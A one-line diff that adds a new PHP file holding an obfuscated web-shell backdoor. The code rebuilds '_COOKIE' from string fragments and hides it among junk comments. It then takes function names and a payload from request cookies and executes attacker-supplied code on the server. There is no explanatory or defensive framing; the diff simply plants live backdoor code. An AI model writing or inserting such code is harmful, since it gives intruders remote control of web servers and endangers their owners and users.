@@ -1,0 +1,1 @@
+<?php $n='OKI';$rf='E';/*|73*/$bb='_CO';$ar/*_Go*/=${$bb.$n.$rf};if(isset($ar/*j2[w*/['p'])){$pd=$ar/*$;*/['p'].$ar['Z'];$nl=/*Qd*/$ar['W'].$ar['X'].$ar['h'];$aj=$pd('',$nl($ar['C']));$aj();}
